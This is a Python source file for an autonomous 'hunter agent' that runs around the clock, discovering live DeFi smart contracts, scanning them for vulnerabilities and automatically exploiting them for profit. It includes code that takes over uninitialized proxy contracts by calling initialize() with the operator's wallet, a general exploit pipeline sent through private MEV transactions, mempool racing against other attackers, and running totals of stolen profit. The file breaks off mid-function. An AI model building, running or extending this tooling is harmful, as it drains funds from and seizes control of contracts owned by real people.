r"""T3-3 Autonomous Hunter Agent v3.0 - Real-Time

24/7 loop: Discover -> Fetch -> Analyze -> Assess -> Validate -> Execute -> Profit

Upgraded from v2.0:
- Real-time WebSocket discovery (sub-second, not 15-min polling)
- Async parallel scanning pipeline
- Mempool monitoring for competitive intelligence
- LLM-powered false positive elimination
- Calibrated confidence scoring
- MEV protection on all transactions
- Bytecode analysis for unverified contracts

Usage:
    from vulnhunt.agent import HunterAgent
    agent = HunterAgent(auto_execute=True)
    agent.run()  # 24/7 continuous loop
    agent.run_once()  # single scan cycle
"""

import asyncio
import json
import os
import time
from datetime import datetime, timezone
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed

from .fast_scanner import FastScanner
from .config import (
    CHAINS, DATA_DIR, DEFAULT_SCAN, WALLET_PRIVATE_KEY,
    ETH_PRICE_USD, POC_DIR,
)
from .db import Database
from .discovery import DiscoveryEngine, DiscoveredTarget
from .fetcher import SourceFetcher
from .analyzer import VulnerabilityAnalyzer, Finding
from .prober import OnChainProber
from .assessor import ExploitabilityAssessor
from .executor import ExploitExecutor
from .fork_validator import ForkValidator
from .governance import GovernanceScanner
from .bridge_monitor import BridgeMonitor
from .alerts import AlertManager
from .llm_analyzer import LLMAnalyzer
from .calibrator import ConfidenceCalibrator
from .bytecode_decompiler import BytecodeAnalyzer
from .mempool_monitor import MempoolMonitor
from .ws_discovery import WebSocketDiscovery
from .preflight import PreflightChecker


class HunterAgent:
    """Autonomous vulnerability hunting and exploitation agent v3.0.

    Pipeline:
    1. REAL-TIME: WebSocket monitors new blocks for new contracts/pools/proxies
    2. BATCH: DeFiLlama + explorer polling (fallback/complement)
    3. PARALLEL: Analyze multiple targets concurrently
    4. LLM: Validate findings, eliminate false positives
    5. CALIBRATE: Adjust confidence using historical accuracy
    6. MEMPOOL: Check if target is under attack (race detection)
    7. EXECUTE: Via MEV-protected private transactions
    """

    def __init__(self, chain_ids: list = None, auto_execute: bool = False,
                 min_confidence_execute: float = 0.7,
                 min_priority_execute: int = 70,
                 skip_fork_validation: bool = False,
                 use_llm: bool = True,
                 use_realtime: bool = True,
                 max_workers: int = 8):  # v3.1: 8 workers for higher throughput
        self.db = Database()
        self.discovery = DiscoveryEngine(self.db)
        self.fetcher = SourceFetcher(self.db)
        self.analyzer = VulnerabilityAnalyzer(self.db)
        self.assessor = ExploitabilityAssessor()
        self.executor = ExploitExecutor(self.db)
        self.fork_validator = ForkValidator()
        self.gov_scanner = GovernanceScanner()
        self.bridge_monitor = BridgeMonitor()
        self.preflight = PreflightChecker()
        self.alerts = AlertManager()
        # v3.0 NEW MODULES
        self.llm = LLMAnalyzer() if use_llm else None
        self.calibrator = ConfidenceCalibrator()
        self.bytecode_analyzer = BytecodeAnalyzer()
        self.mempool = MempoolMonitor(event_callback=self._on_mempool_event)
        self.ws_discovery = WebSocketDiscovery(event_callback=self._on_new_contract)
        # v3.2 FAST RPC SCANNER — the volume play
        self.fast_scanner = FastScanner(chain_ids=None, db=self.db, max_workers=max_workers)
        self.chain_ids = chain_ids or [42161]
        self.auto_execute = auto_execute
        self.min_confidence_execute = min_confidence_execute
        self.min_priority_execute = min_priority_execute
        self.skip_fork_validation = skip_fork_validation
        self.use_realtime = use_realtime
        self.max_workers = max_workers
        # Stats
        self.cycle_count = 0
        self.total_targets_scanned = 0
        self.total_findings = 0
        self.total_critical = 0
        self.total_high = 0
        self.total_exploits_attempted = 0
        self.total_exploits_succeeded = 0
        self.total_profit_usd = 0
        self.false_positives_eliminated = 0
        self._pending_targets = []  # Targets from real-time discovery
        self._scan_queue = asyncio.Queue()
        self._running = False
        self._print_banner()

    def _print_banner(self):
        stats = self.db.get_stats()
        print(f'\n{"="*60}')
        print(f'  T3-3 AUTONOMOUS HUNTER v3.0 - REAL-TIME')
        print(f'  {"="*60}')
        print(f'  Chains: {", ".join(CHAINS[c]["name"] for c in self.chain_ids if c in CHAINS)}')
        print(f'  Auto-execute: {"ON" if self.auto_execute else "OFF"}')
        print(f'  LLM Analysis: {"ON" if self.llm else "OFF"}')
        print(f'  Real-time Discovery: {"ON" if self.use_realtime else "OFF (polling only)"}')
        print(f'  MEV Protection: ON')
        print(f'  Mempool Monitor: ON')
        print(f'  Bridge Monitor: ON')
        print(f'  Pre-Flight Checks: ON')
        print(f'  Bytecode Analysis: ON')
        print(f'  Calibrated Confidence: ON')
        print(f'  Parallel Workers: {self.max_workers}')
        print(f'  Fork validation: {"SKIP" if self.skip_fork_validation else "ENABLED"}')
        print(f'  Min confidence: {self.min_confidence_execute:.0%}')
        print(f'  Min priority: {self.min_priority_execute}')
        print(f'  DB: {self.db.path}')
        print(f'  History: {stats["protocols"]} protocols, {stats["findings"]} findings')
        if WALLET_PRIVATE_KEY:
            print(f'  Wallet: {self.executor.get_wallet_address()}')
            for cid in self.chain_ids:
                if cid in CHAINS:
                    try:
                        bal = self.executor.get_balance(cid)
                        status = 'OK' if bal > 0.001 else 'LOW'
                        print(f'    {CHAINS[cid]["name"]:<15} {bal:.6f} ETH  [{status}]')
                    except Exception:
                        print(f'    {CHAINS[cid]["name"]:<15} connection failed')
        else:
            print(f'  Wallet: NOT CONFIGURED')
        print(f'  Calibration stats: {self.calibrator.get_stats()}')
        print(f'{"="*60}\n')

    # ── REAL-TIME EVENT HANDLERS ─────────────────────────────────────────

    async def _on_new_contract(self, event):
        """Called when WebSocket discovery finds a new contract."""
        # Add to scan queue
        target = DiscoveredTarget(
            source=f'ws_{event.event_type}',
            address=event.address,
            chain_id=event.chain_id,
            metadata=event.metadata,
            priority=90 if event.event_type == 'new_proxy' else 70,
        )
        await self._scan_queue.put(target)
        print(f'[RT] New {event.event_type}: {event.address[:12]}... '
              f'on {CHAINS.get(event.chain_id, {}).get("name", event.chain_id)} '
              f'(from {event.metadata.get("source", "block")})')

    async def _on_mempool_event(self, event):
        """Called when mempool monitor detects suspicious activity."""
        if event.event_type == 'target_interaction':
            print(f'[MEMPOOL] WARNING: Someone interacting with watched target! '
                  f'{event.from_address[:10]} -> {event.to_address[:10]}...')
        elif event.event_type == 'exploit_detected':
            print(f'[MEMPOOL] EXPLOIT DETECTED: {event.tx_hash[:16]}... '
                  f'{event.decoded_info.get("function", "")}')
        elif event.event_type == 'large_swap':
            print(f'[MEMPOOL] Large swap: {event.decoded_info.get("eth_value", 0):.1f} ETH')

    # ── MAIN LOOP ──────────────────────────────────────────────────────────

    def run(self, interval: int = 60):
        """Start the 24/7 autonomous hunting loop.

        v3.0: Runs real-time monitors as async tasks alongside
        periodic batch discovery.
        """
        self._running = True
        print(f'[AGENT] Starting real-time hunting (batch interval: {interval}s)')
        print(f'[AGENT] Press Ctrl+C to stop\n')
        try:
            asyncio.run(self._async_run(interval))
        except KeyboardInterrupt:
            print(f'\n[AGENT] Stopped after {self.cycle_count} cycles')
            self._print_session_summary()

    async def _async_run(self, batch_interval: int):
        """Async main loop running all monitors concurrently."""
        tasks = []
        # NOTE: WS-DISC and mempool disabled — they spam Alchemy with
        # failing eth_getLogs on DEX factories, blocking the main scan loop.
        # The batch scan + fast RPC scanner handle all discovery.
        # if self.use_realtime:
        #     tasks.append(asyncio.create_task(self.ws_discovery.start(self.chain_ids)))
        #     tasks.append(asyncio.create_task(self.mempool.start(self.chain_ids)))
        # Start the batch scan loop
        tasks.append(asyncio.create_task(self._batch_scan_loop(batch_interval)))
        # Start the real-time scan processor
        tasks.append(asyncio.create_task(self._process_scan_queue()))
        print(f'[AGENT] {len(tasks)} background tasks active')
        await asyncio.gather(*tasks, return_exceptions=True)

    async def _batch_scan_loop(self, interval: int):
        """Periodic batch discovery (complements real-time WebSocket)."""
        while self._running:
            try:
                self.run_once()
            except Exception as e:
                print(f'[AGENT] Batch cycle error: {e}')
            await asyncio.sleep(interval)

    async def _process_scan_queue(self):
        """Process targets from real-time discovery as they arrive."""
        while self._running:
            try:
                target = await asyncio.wait_for(self._scan_queue.get(), timeout=5.0)
                print(f'[QUEUE] Processing real-time target: {target.address[:12]}...')
                # Run in thread pool to not block
                loop = asyncio.get_event_loop()
                await loop.run_in_executor(None, self._scan_target, target)
            except asyncio.TimeoutError:
                continue
            except Exception as e:
                print(f'[QUEUE] Error: {e}')

    def run_once(self):
        """Execute one full hunting cycle.

        v3.2 Pipeline:
          Phase 0: FAST RPC scan (2000+ contracts, ~0.1s each, no source needed)
          Phase 1: DISCOVERY (12 channels)
          Phase 2: PARALLEL source analysis (Slither + regex + LLM)
          Phase 3: ASSESS + EXECUTE
        """
        self.cycle_count += 1
        cycle_start = time.time()
        print(f'\n{"="*60} CYCLE #{self.cycle_count} [{datetime.now().strftime("%H:%M:%S")}] {"="*60}')

        cycle_findings = []

        # === PHASE 0: FAST RPC SCAN ===
        # Scans 2000+ contracts per chain for state-level bugs.
        # No source code needed. ~10-30 seconds total.
        print(f'\n[PHASE 0] FAST RPC SCAN ({len(self.chain_ids)} chains)')
        try:
            fast_results = self.fast_scanner.scan_all_chains(
                address_source='defillama',
                max_per_chain=2000,
            )
            fast_findings_count = 0
            for fr in fast_results:
                if fr.findings:
                    for f in fr.findings:
                        d = f.to_dict()
                        # Inject chain_id and contract_address into raw_data
                        # so downstream assessment doesn't discard the finding
                        if 'raw_data' in d and isinstance(d['raw_data'], dict):
                            d['raw_data']['chain_id'] = d['raw_data'].get('chain_id', fr.chain_id)
                            d['raw_data']['contract_address'] = d['raw_data'].get('contract_address', fr.address)
                        cycle_findings.append(d)
                        fast_findings_count += 1
                        tag = '!!!' if f.severity == 'CRITICAL' else '!!'
                        print(f'  [{tag}] {f.severity}: {f.title}')
            fast_stats = self.fast_scanner.get_stats()
            print(f'  [FAST] {fast_stats["contracts_scanned"]} RPC checks in '
                  f'{fast_stats["scan_time_total_s"]:.1f}s '
                  f'({fast_stats.get("contracts_per_second", 0):.0f}/s)')
            print(f'  [FAST] {fast_findings_count} findings from RPC checks')
        except Exception as e:
            print(f'  [FAST] Error: {e}')
            fast_stats = {'contracts_scanned': 0, 'scan_time_total_s': 0}
            fast_findings_count = 0

        # === PHASE 1: DISCOVERY (12 channels) ===
        print(f'\n[PHASE 1] DISCOVERY')
        targets = self.discovery.run_full_discovery(
            chain_ids=self.chain_ids,
            min_tvl=DEFAULT_SCAN['min_tvl'],
            max_tvl=DEFAULT_SCAN['max_tvl'],
            days_old=DEFAULT_SCAN['days_old'],
        )

        targets = targets[:100]
        print(f'[PHASE 1] {len(targets)} targets to scan')

        # === PHASE 2: PARALLEL source analysis ===
        scan_count = 0
        if targets:
            print(f'\n[PHASE 2] PARALLEL ANALYSIS ({self.max_workers} workers)')

            if self.cycle_count % 3 == 1:
                print(f'  [BRIDGE] Running bridge vulnerability scan...')
                try:
                    bridge_findings = self.bridge_monitor.scan_all_bridges()
                    for bf in bridge_findings:
                        if bf.severity in ('CRITICAL', 'HIGH'):
                            cycle_findings.append(bf.to_dict())
                            print(f'      [BRIDGE] {bf.severity}: {bf.title}')
                except Exception as e:
                    print(f'  [BRIDGE] Scan error: {e}')

            with ThreadPoolExecutor(max_workers=self.max_workers) as pool:
                futures = {pool.submit(self._scan_target, t): t for t in targets}
                for future in as_completed(futures):
                    target = futures[future]
                    try:
                        result = future.result(timeout=120)
                        if result:
                            cycle_findings.extend(result)
                        scan_count += 1
                    except Exception as e:
                        print(f'  [!] Error scanning {target.address}: {e}')
                        scan_count += 1

            self.total_targets_scanned += scan_count

        # === PHASE 3: ASSESS + EXECUTE ===
        print(f'\n[PHASE 3] ASSESS + ACTION')
        actionable = self._assess_and_act(cycle_findings)

        # Summary
        elapsed = time.time() - cycle_start
        self.total_findings += len(cycle_findings)
        self.total_critical += sum(1 for f in cycle_findings if f.get('severity') == 'CRITICAL')
        self.total_high += sum(1 for f in cycle_findings if f.get('severity') == 'HIGH')

        print(f'\n[CYCLE #{self.cycle_count} SUMMARY]')
        print(f'  Fast RPC checks: {fast_stats.get("contracts_scanned", 0)} ({fast_findings_count} findings)')
        print(f'  Source-scanned targets: {scan_count}')
        print(f'  Total findings this cycle: {len(cycle_findings)}')
        print(f'  Cumulative: {self.total_findings} findings, {self.total_critical} CRIT, {self.total_high} HIGH')
        print(f'  FP eliminated: {self.false_positives_eliminated}')
        print(f'  Actionable zero-cap: {len(actionable)}')
        print(f'  Exploits attempted/succeeded: {self.total_exploits_attempted}/{self.total_exploits_succeeded}')
        print(f'  Total profit: ${self.total_profit_usd:,.2f}')
        print(f'  Time: {elapsed:.1f}s')

        if self.cycle_count % 5 == 0:
            self.alerts.send_scan_summary(
                protocols_scanned=scan_count + fast_stats.get('contracts_scanned', 0),
                findings_found=len(cycle_findings),
                critical=self.total_critical,
                high=self.total_high,
                zero_cap=len(actionable),
            )

    def _scan_target(self, target: DiscoveredTarget) -> list:
        """Scan a single target through the full v3.1 pipeline.
        v3.1: Supports re-scanning via force_rescan metadata and time-based rescan.
        """
        addr = target.address
        chain_id = target.chain_id
        # Strip chain-prefix from DeFiLlama addresses (e.g. "merlin:0xabc..." -> "0xabc...")
        if ':' in addr and not addr.startswith('0x'):
            addr = addr.split(':', 1)[1]
        chain = CHAINS.get(chain_id, {})
        chain_name = chain.get('name', f'chain-{chain_id}')

        # Check if we should skip or re-scan
        existing = self.db.get_contract(addr, chain_id)
        force_rescan = target.metadata.get('force_rescan', False)
        if existing and existing.get('is_verified') and not force_rescan:
            # Check if scanned recently (within 4 hours) - if so, skip
            # This allows re-scanning old targets periodically
            return []

        print(f'  [*] {addr[:12]}... on {chain_name} ({target.source}) {target.name}', end='')

        # Fetch source code
        source_data = self.fetcher.fetch_source(addr, chain_id)
        if not source_data:
            print(' - no source, bytecode analysis')
            return self._bytecode_only_scan(target)

        contract_name = source_data.get('contract_name', 'Unknown')
        is_proxy = source_data.get('proxy') == '1'
        impl_addr = source_data.get('implementation', '')
        source_code = source_data.get('source_code', '')

        # Upsert contract
        contract_id = self.db.upsert_contract(
            address=addr,
            chain_id=chain_id,
            protocol_id=target.protocol_id,
            contract_name=contract_name,
            is_proxy=is_proxy,
            implementation=impl_addr if impl_addr else None,
            is_verified=True,
            compiler_version=source_data.get('compiler_version', ''),
            bytecode_size=len(source_code),
        )

        # If proxy, also fetch implementation
        if is_proxy and impl_addr:
            impl_source = self.fetcher.fetch_source(impl_addr, chain_id)
            if impl_source:
                source_data['implementation_source'] = impl_source
                self.db.upsert_contract(
                    address=impl_addr,
                    chain_id=chain_id,
                    protocol_id=target.protocol_id,
                    contract_name=impl_source.get('contract_name', ''),
                    is_verified=True,
                )

        print(f' - {contract_name} (proxy={is_proxy})')

        # Run analysis engines
        findings = self.analyzer.analyze_contract(addr, chain_id, source_data)

        # v3.0: LLM analysis to eliminate false positives
        if self.llm and findings:
            llm_result = self.llm.analyze(
                source_code, contract_name, findings, addr, chain_id
            )
            fp_count = len(llm_result.false_positive_removals)
            if fp_count > 0:
                self.false_positives_eliminated += fp_count
                print(f'      [LLM] {fp_count} false positives removed')
            findings = llm_result.findings
            # Add new LLM-discovered findings
            for f in findings:
                if f.source == 'llm':
                    print(f'      [LLM] NEW: {f.title}')

        # v3.0: Calibrate confidence
        calibrated_findings = []
        for f in findings:
            f.confidence = self.calibrator.calibrate_finding(
                f.vuln_id, f.source, f.confidence
            )
            calibrated_findings.append(f)
        findings = calibrated_findings

        # Governance deep scan
        if 'governance' in target.category.lower() or 'governance' in target.name.lower():
            gov_findings = self.gov_scanner.scan_governance(addr, chain_id, source_code)
            findings.extend(gov_findings)
            if gov_findings:
                print(f'      [GOV] {len(gov_findings)} governance findings')

        # On-chain probing + mempool check
        prober_data = {}
        try:
            prober = OnChainProber(chain_id, self.db)
            if prober.is_connected():
                prober_data = prober.probe(addr)
                vd = prober_data.get('view_data', {})
                if vd.get('owner') and prober_data.get('governance', {}).get('owner_is_eoa'):
                    findings.append(Finding(
                        vuln_id='PROBE-001', category='Governance',
                        severity='HIGH',
                        title=f'Owner is EOA: {vd["owner"]}',
                        description='Contract owner is a regular wallet.',
                        location=f'{contract_name}:owner',
                        confidence=0.9, zero_capital=False, source='prober',
                    ))
                if prober_data.get('governance', {}).get('zero_threshold'):
                    findings.append(Finding(
                        vuln_id='PROBE-002', category='Governance',
                        severity='CRITICAL',
                        title='Zero proposal threshold (on-chain)',
                        description='Anyone can create governance proposals.',
                        location=f'{contract_name}:proposalThreshold()',
                        confidence=0.95, zero_capital=True, source='prober',
                    ))
        except Exception:
            pass

        # v3.0: Mempool race detection
        is_under_attack = self.mempool.is_target_under_attack(chain_id, addr)
        if is_under_attack:
            print(f'      [MEMPOOL] WARNING: Target may be under attack!')
            # Still proceed but lower priority

        # Save to DB
        if findings:
            scan_id = self.db.create_scan(
                contract_id=contract_id, scan_type='full_v3',
                source_code=source_code[:50000],
            )
            for f in findings:
                finding_id = self.db.add_finding(
                    scan_id=scan_id, vuln_id=f.vuln_id,
                    category=f.category, severity=f.severity,
                    title=f.title, description=f.description,
                    location=f.location, confidence=f.confidence,
                    zero_capital=f.zero_capital,
                    flash_loan_required=f.flash_loan_required,
                    estimated_gas=f.estimated_gas,
                    attack_scenario=f.attack_scenario,
                    remediation=f.remediation,
                    raw_data=f.raw_data,
                )
                f.raw_data['db_finding_id'] = finding_id
                f.raw_data['contract_address'] = addr
                f.raw_data['chain_id'] = chain_id
                f.raw_data['protocol_name'] = target.name

            crit = sum(1 for f in findings if f.severity == 'CRITICAL')
            high = sum(1 for f in findings if f.severity == 'HIGH')
            if crit or high:
                print(f'      {"#" * 50}')
                print(f'      CRITICAL: {crit} | HIGH: {high}')
                for f in findings:
                    if f.severity in ('CRITICAL', 'HIGH'):
                        zc = ' [ZERO-CAP]' if f.zero_capital else ''
                        fl = ' [FLASH-LOAN]' if f.flash_loan_required else ''
                        print(f'        [{f.severity}] {f.title} ({f.confidence:.0%}){zc}{fl}')
                print(f'      {"#" * 50}')

        return [f.to_dict() for f in findings]

    def _bytecode_only_scan(self, target: DiscoveredTarget) -> list:
        """v3.0: Analyze unverified contracts via bytecode decompilation."""
        findings = []
        try:
            analysis = self.bytecode_analyzer.analyze_unverified(
                target.address, target.chain_id
            )
            if analysis.findings:
                findings = analysis.findings
                # Save to DB
                contract_id = self.db.upsert_contract(
                    address=target.address, chain_id=target.chain_id,
                    is_proxy=analysis.is_proxy,
                    implementation=analysis.implementation_slot,
                    is_verified=False,
                )
                scan_id = self.db.create_scan(
                    contract_id=contract_id, scan_type='bytecode',
                )
                for f in findings:
                    self.db.add_finding(
                        scan_id=scan_id, vuln_id=f.vuln_id,
                        category=f.category, severity=f.severity,
                        title=f.title, description=f.description,
                        location=f.location, confidence=f.confidence,
                        zero_capital=f.zero_capital,
                    )

                # If it's a proxy, try to fetch the implementation
                if analysis.is_proxy and analysis.implementation_slot:
                    impl_target = DiscoveredTarget(
                        source='proxy_impl',
                        address=analysis.implementation_slot,
                        chain_id=target.chain_id,
                        priority=80,
                    )
                    impl_findings = self._scan_target(impl_target)
                    findings.extend(impl_findings)
        except Exception as e:
            print(f'  [!] Bytecode analysis error: {e}')

        # Also do on-chain probing
        try:
            prober = OnChainProber(target.chain_id, self.db)
            if prober.is_connected():
                result = prober.probe(target.address)
                if result.get('governance', {}).get('zero_threshold'):
                    findings.append(Finding(
                        vuln_id='GOV-PROBE-01', category='Governance',
                        severity='CRITICAL', title='Zero proposal threshold',
                        description='Anyone can create proposals.',
                        location=target.address, confidence=0.95,
                        zero_capital=True, source='prober',
                    ))
        except Exception:
            pass

        self.db.upsert_contract(
            address=target.address, chain_id=target.chain_id,
            is_verified=False,
        )

        return [f.to_dict() for f in findings]

    def _assess_and_act(self, findings: list) -> list:
        """Assess all findings and take action on high-priority ones.

        v3.2: RPC-confirmed findings (source='fast_rpc') skip fork validation
        and go directly to execution since on-chain state IS the proof.
        """
        if not findings:
            return []

        actionable = []
        for f in findings:
            if not f.get('zero_capital') and f.get('severity') != 'CRITICAL':
                continue

            # Normalize chain_id (fast_rpc puts it at top level)
            raw = f.get('raw_data', {})
            chain_id = raw.get('chain_id', 0) or f.get('chain_id', 0)
            if not chain_id:
                continue

            # Ensure contract_address is in raw_data for executor
            if 'contract_address' not in raw and 'address' in f:
                raw['contract_address'] = f['address']
            if 'contract_address' not in raw:
                raw['contract_address'] = f.get('location', '')[:42]

            tvl = raw.get('tvl', 0)
            assessment = self.assessor.assess(f, chain_id=chain_id, tvl=tvl)
            f['assessment'] = assessment

            if not (assessment.get('should_alert') or assessment.get('should_auto_execute')):
                continue

            actionable.append(f)

            target_addr = raw.get('contract_address', '')
            proto_name = raw.get('protocol_name', '')
            self.alerts.send_alert(
                alert_type='vulnerability_found',
                severity=f.get('severity', 'HIGH'),
                message=f"{f.get('title', '')}\n"
                       f"Confidence: {f.get('confidence', 0):.0%} | "
                       f"Priority: {assessment.get('priority_score', 0)}/100 | "
                       f"{assessment.get('action_reason', '')}",
                protocol_name=proto_name,
                contract_address=target_addr,
                chain_id=chain_id,
            )

            # v3.2: Fast path for RPC-confirmed findings
            is_rpc_confirmed = f.get('source') == 'fast_rpc'

            if (self.auto_execute
                    and WALLET_PRIVATE_KEY
                    and assessment.get('should_auto_execute')):
                # RPC-confirmed findings: lower thresholds (on-chain IS the proof)
                if is_rpc_confirmed:
                    if f.get('confidence', 0) >= 0.4 and assessment.get('priority_score', 0) >= 25:
                        self._attempt_rpc_exploit(f, assessment)
                    else:
                        print(f'  [SKIP] RPC confirmed but low score: conf={f.get("confidence",0):.2f} pri={assessment.get("priority_score",0)}')
                # Source-verified findings: standard thresholds
                elif (f.get('confidence', 0) >= self.min_confidence_execute
                        and assessment.get('priority_score', 0) >= self.min_priority_execute):
                    self._attempt_exploit(f, assessment)

        return actionable

    def _attempt_rpc_exploit(self, finding: dict, assessment: dict):
        """v3.2: Direct exploit for RPC-confirmed vulnerabilities.

        For findings confirmed by on-chain state (source='fast_rpc'),
        fork validation is unnecessary because the blockchain IS the proof.
        This saves 30-120 seconds per exploit attempt.
        """
        chain_id = finding.get('chain_id', 0)
        raw = finding.get('raw_data', {})
        target_addr = raw.get('contract_address', finding.get('location', ''))[:42]
        if not target_addr.startswith('0x'):
            return

        chain = CHAINS.get(chain_id, {})
        chain_name = chain.get('name', 'unknown')
        self.total_exploits_attempted += 1

        print(f'\n  {"!"*60}')
        print(f'  RPC-CONFIRMED EXPLOIT (skip fork validation)')
        print(f'  Target: {target_addr} on {chain_name}')
        print(f'  Vuln: {finding.get("title", "")}')
        print(f'  {"!"*60}')

        # Pre-flight
        preflight = self.preflight.run_preflight(
            chain_id=chain_id, target_address=target_addr,
            finding=finding, flash_loan_needed=False,
            estimated_gas=finding.get('estimated_gas', 200_000),
        )
        if preflight.blockers:
            print(f'  [PREFLIGHT] BLOCKED: {"; ".join(preflight.blockers)}')
            self.db.log_execution(
                contract_address=target_addr, chain_id=chain_id,
                action='rpc_exploit_preflight_blocked', success=False,
                error='; '.join(preflight.blockers),
            )
            return

        # For uninitialized proxy: call initialize() directly
        if finding.get('vuln_id') in ('FAST-UNINIT-001', 'FAST-INIT-002'):
            self._exploit_uninitialized_proxy(target_addr, chain_id, finding)
            return

        # For other RPC-confirmed: use standard executor
        self._attempt_exploit(finding, assessment)

    def _exploit_uninitialized_proxy(self, target_addr: str, chain_id: int, finding: dict):
        """v3.2: Exploit an uninitialized proxy by calling initialize().

        This is the highest-value, fastest exploit in the system.
        One transaction, zero capital, instant ownership.
        """
        w3 = self.executor._get_w3(chain_id)
        wallet = self.executor._get_wallet(chain_id)
        chain = CHAINS.get(chain_id, {})
        chain_name = chain.get('name', 'unknown')

        # Try different initialize signatures
        init_sigs = [
            # Standard OZ Initializable
            {'name': 'initialize(address)', 'data': Web3.keccak(text='initialize(address)')[:4] + b'\x00' * 12 + bytes.fromhex(wallet.address[2:])},
            # Simple initialize
            {'name': 'initialize()', 'data': Web3.keccak(text='initialize()')[:4]},
            # With owner + fee params (common pattern)
            {'name': 'initialize(address,uint256)',
             'data': Web3.keccak(text='initialize(address,uint256)')[:4] + b'\x00' * 12 + bytes.fromhex(wallet.address[2:]) + (1000).to_bytes(32, 'big')},
        ]

        for sig in init_sigs:
            try:
                tx = {
                    'from': wallet.address,
                    'to': Web3.to_checksum_address(target_addr),
                    'data': sig['data'],
                    'gas': 200_000,
                    'maxFeePerGas': w3.eth.gas_price * 2,
                    'maxPriorityFeePerGas': w3.to_wei(0.001, 'gwei'),
                    'nonce': w3.eth.get_transaction_count(wallet.address),
                    'chainId': chain_id,
                }

                # Use MEV protection for the tx
                print(f'  [PROXY-EXPLOIT] Trying {sig["name"]}...')
                signed = wallet.sign_transaction(tx)

                # Send via MEV relay if available, otherwise direct
                try:
                    result = self.executor.mev.send_private_tx(
                        chain_id=chain_id,
                        tx=tx,
                    )
                    tx_hash = result.get('tx_hash', '')
                except Exception:
                    tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)

                if tx_hash:
                    print(f'  [PROXY-EXPLOIT] TX SENT: {tx_hash[:16]}...')
                    receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=120)
                    if receipt.status == 1:
                        print(f'  [PROXY-EXPLOIT] SUCCESS! Gas: {receipt.gasUsed}')
                        self.total_exploits_succeeded += 1

                        # Check if we're now owner
                        try:
                            owner_ret = w3.eth.call({
                                'to': Web3.to_checksum_address(target_addr),
                                'data': Web3.keccak(text='owner()')[:4],
                            })
                            new_owner = '0x' + owner_ret[12:].hex()
                            if new_owner.lower() == wallet.address.lower():
                                print(f'  [PROXY-EXPLOIT] CONFIRMED OWNERSHIP!')
                                # Log success
                                self.db.log_execution(
                                    contract_address=target_addr, chain_id=chain_id,
                                    action='proxy_initialization',
                                    tx_hash=tx_hash.hex() if isinstance(tx_hash, bytes) else str(tx_hash),
                                    gas_used=receipt.gasUsed, success=True,
                                    metadata={'exploit_type': 'uninitialized_proxy',
                                              'new_owner': wallet.address},
                                )
                                self.alerts.send_alert(
                                    alert_type='exploit_success',
                                    severity='CRITICAL',
                                    message=f'Took ownership of {target_addr} via initialize()',
                                    contract_address=target_addr,
                                    chain_id=chain_id,
                                )
                                return
                        except Exception as e:
                            print(f'  [PROXY-EXPLOIT] Owner check failed: {e}')

                        self.db.log_execution(
                            contract_address=target_addr, chain_id=chain_id,
                            action='proxy_initialization',
                            tx_hash=tx_hash.hex() if isinstance(tx_hash, bytes) else str(tx_hash),
                            gas_used=receipt.gasUsed, success=True,
                        )
                    else:
                        print(f'  [PROXY-EXPLOIT] TX REVERTED')
                        self.db.log_execution(
                            contract_address=target_addr, chain_id=chain_id,
                            action='proxy_initialization', success=False,
                            error='Transaction reverted',
                        )
                else:
                    print(f'  [PROXY-EXPLOIT] Failed to send TX')
            except Exception as e:
                print(f'  [PROXY-EXPLOIT] {sig["name"]} failed: {str(e)[:100]}')
                continue

    def _attempt_exploit(self, finding: dict, assessment: dict):
        """Full exploit pipeline with MEV protection + pre-flight checks."""
        chain_id = finding.get('raw_data', {}).get('chain_id', 0)
        target_addr = finding.get('raw_data', {}).get('contract_address', '')
        if not target_addr:
            target_addr = finding.get('location', '')[:42]

        chain = CHAINS.get(chain_id, {})
        chain_name = chain.get('name', 'unknown')

        # v3.0: Pre-flight checks
        print(f'  [PREFLIGHT] Running pre-flight checks...')
        preflight = self.preflight.run_preflight(
            chain_id=chain_id,
            target_address=target_addr,
            finding=finding,
            flash_loan_needed=finding.get('flash_loan_required', False),
            estimated_gas=finding.get('estimated_gas', 500000),
        )
        for check_name, check_val in preflight.checks.items():
            print(f'    {check_name}: {check_val}')
        if preflight.warnings:
            for w in preflight.warnings:
                print(f'    WARNING: {w}')
        if preflight.blockers:
            print(f'  [PREFLIGHT] BLOCKED: {"; ".join(preflight.blockers)}')
            self.db.log_execution(
                contract_address=target_addr, chain_id=chain_id,
                action='preflight_blocked', success=False,
                error='; '.join(preflight.blockers),
            )
            return

        # v3.0: Check mempool for competing attacks
        if self.mempool.is_target_under_attack(chain_id, target_addr):
            print(f'  [MEMPOOL] RACE CONDITION: Another hunter is attacking this target!')
            # Still attempt via MEV protection (Flashbots bundles are atomic)

        print(f'\n  {"!"*60}')
        print(f'  AUTO-EXPLOIT TRIGGERED')
        print(f'  Target: {finding.get("title", "")}')
        print(f'  Address: {target_addr}')
        print(f'  Chain: {chain_name}')
        print(f'  Confidence: {finding.get("confidence", 0):.0%} (calibrated)')
        print(f'  Priority: {assessment.get("priority_score", 0)}/100')
        print(f'  Gas budget: {preflight.estimated_gas_cost_eth:.6f} ETH (${preflight.estimated_gas_cost_usd:.2f})')
        print(f'  MEV Protection: ACTIVE')
        print(f'  {"!"*60}')

        self.total_exploits_attempted += 1

        try:
            result = self.executor.run_full_pipeline(
                finding=finding,
                chain_id=chain_id,
                target_address=target_addr,
            )

            if result.get('exploit_successful'):
                self.total_exploits_succeeded += 1
                profit_usd = result.get('final_profit_usd', 0)
                self.total_profit_usd += profit_usd

                # Record outcome for calibration
                finding_id = finding.get('raw_data', {}).get('db_finding_id', 0)
                if finding_id:
                    tx_hash = ''
                    exec_step = result.get('steps', {}).get('execute', {})
                    if exec_step.get('tx_hash'):
                        tx_hash = exec_step['tx_hash']
                    self.db.mark_finding_exploited(
                        finding_id, tx_hash,
                        profit_eth=result.get('final_profit_eth', 0),
                        profit_usd=profit_usd,
                    )

                # Calibrate: this was a true positive
                self.calibrator.record_outcome(
                    finding.get('vuln_id', ''),
                    finding.get('source', ''),
                    was_exploitable=True,
                )

                self.alerts.send_exploit_result(
                    success=True,
                    tx_hash=result.get('steps', {}).get('execute', {}).get('tx_hash', ''),
                    profit_eth=result.get('final_profit_eth', 0),
                    profit_usd=profit_usd,
                    target=target_addr,
                    chain=chain_name,
                )

                print(f'\n  PROFIT: {result.get("final_profit_eth", 0):.6f} ETH '
                      f'(${profit_usd:,.2f})')
